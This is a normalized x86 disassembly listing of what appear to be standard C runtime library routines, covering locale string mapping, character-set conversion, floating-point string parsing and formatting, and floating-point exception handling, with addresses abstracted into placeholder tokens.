mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40ca9d
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_40b3d0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40b3d0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40ca9d
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40cac8
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_40cae9
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_40cac8
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_40cac8
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_40cac8
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_40cac8
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_40cb47
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_40cb75
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_40cba2
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_40cb47
push ebx
call sub_40cb47
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40cae9
push ebx
call sub_40cb47
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40cae9
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_40cb47
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_40cc69
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
je r-xdata
jmp [ eax * 4 + jump_table_40d10a ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x24 ] edx
jle r-xdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe r-xdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40a362
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
cmp [ rw-data ] edx
jle r-xdata
cmp bl 0x30
jne r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40a362
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x31
jl r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp bl 0x30
jne r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40a362
pop ecx
pop ecx
push 0x1
pop edx
jmp r-xdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
cmp bl 0x30
jne r-xdata
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp r-xdata
dec eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x4 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec edi
jmp r-xdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
push 0x8
jmp r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_40cba2
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge r-xdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne r-xdata
neg eax
jmp r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle r-xdata
cmp eax 0x1450
jle r-xdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp eax 0xffffebb0
jge r-xdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg r-xdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_40dfb4
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_40d13a
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40dfb4
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40dd94
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_40a890
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_40cb47
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_40cb75
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_40a890
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_40cb47
lea eax [ ebp - 0x10 ]
push eax
call sub_40cb47
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40cae9
lea eax [ ebp - 0x10 ]
push eax
call sub_40cb47
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_40d3cd
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
test al 0x82
mov [ ebp - 0x4 ] ecx
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
xor ebx ebx
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] ebx
and al 0xef
mov [ ebp + 0xc ] ebx
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
test al 0x10
mov [ esi + 0x4 ] ebx
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov edx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] edx
mov [ esi + 0xc ] eax
mov ebx [ ebp + 0x8 ]
push 0x2
pop edi
lea eax [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp + 0x8 ] bx
call sub_409185
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea edx [ eax + 0x2 ]
mov [ esi ] edx
mov edx [ esi + 0x18 ]
dec edx
dec edx
cmp edi ebx
mov [ esi + 0x4 ] edx
jle r-xdata
push ecx
call sub_40ac82
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax ebx
and eax 0xffff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push ecx
call sub_409185
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push esi
call sub_40ac3e
pop ecx
pop esi
pop ebx
leave
retn
mov eax 0xffff
mov eax rw-data
mov eax ecx
mov edx ecx
sar eax 0x5
and edx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push 0x2
push ebx
push ecx
call sub_40aba4
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40d4f1
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
push ebx
push esi
mov [ ecx + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push edi
push 0x1
mov [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
pop ebx
mov [ ecx + 0xc ] eax
mov cl [ ebp + 0x10 ]
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x10 ] 0xc000008f
or [ eax + 0x4 ] ebx
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x10 ] 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x10 ] 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x10 ] 0xc000008e
or [ eax + 0x4 ] 0x8
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x2
mov ecx [ esi ]
mov edx [ eax + 0x8 ]
not ecx
and ecx ebx
and edx 0xffffffef
shl ecx 0x4
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
not ecx
mov edx [ eax + 0x8 ]
and ecx 0x4
shl ecx 0x1
and edx 0xfffffff7
or ecx edx
mov [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
not ecx
mov edx [ eax + 0x8 ]
shr ecx 0x1
and ecx 0x4
and edx 0xfffffffb
or ecx edx
mov [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
not ecx
mov edx [ eax + 0x8 ]
shr ecx 0x3
and ecx edi
and edx 0xfffffffd
or ecx edx
mov [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
not ecx
mov edx [ eax + 0x8 ]
shr ecx 0x5
and ecx ebx
and edx 0xfffffffe
or ecx edx
mov [ eax + 0x8 ] ecx
call sub_40d9e4
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x10 ] 0xc0000090
or [ eax + 0x4 ] 0x10
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] edi
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
cmp eax 0x800
je r-xdata
test [ eax + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx edi
jmp r-xdata
cmp eax ecx
jne r-xdata
test [ eax + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
and ecx 0xfff
mov edx [ eax ]
shl ecx 0x5
and edx 0xfffe001f
or ecx edx
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx edi
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x50 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x50 ]
and ecx 0xffffffe3
or ecx edi
mov edi [ ebp + 0x1c ]
mov [ eax + 0x50 ] ecx
mov eax [ ebp + 0x8 ]
fld [ edi ]
fstp [ eax + 0x40 ]
call sub_40d9f2
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x8 ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ eax + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ eax + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov ecx [ eax ]
mov edx 0xfffff3ff
and ecx 0x3
sub ecx 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec ecx
je r-xdata
mov ecx [ esi ]
and ecx edx
or ch 0x3
dec ecx
je r-xdata
mov ecx [ esi ]
and ch 0xf7
or ch 0x4
dec ecx
je r-xdata
mov ecx [ esi ]
and ecx edx
or ch 0x2
jmp r-xdata
dec ecx
jne r-xdata
mov ecx [ eax ]
shr ecx 0x2
and ecx 0x7
sub ecx 0x0
je r-xdata
mov ecx [ esi ]
and ch 0xfb
or ch 0x8
jmp r-xdata
dec ecx
jne r-xdata
mov [ esi ] ecx
fld [ eax + 0x40 ]
fstp [ edi ]
pop edi
pop esi
pop ebx
pop ebp
retn
and [ esi ] edx
jmp r-xdata
mov [ esi ] ecx
jmp r-xdata
or [ esi + 0x1 ] 0xc
jmp r-xdata
sub_40d7a4
push ebp
mov ebp esp
sub esp 0xc
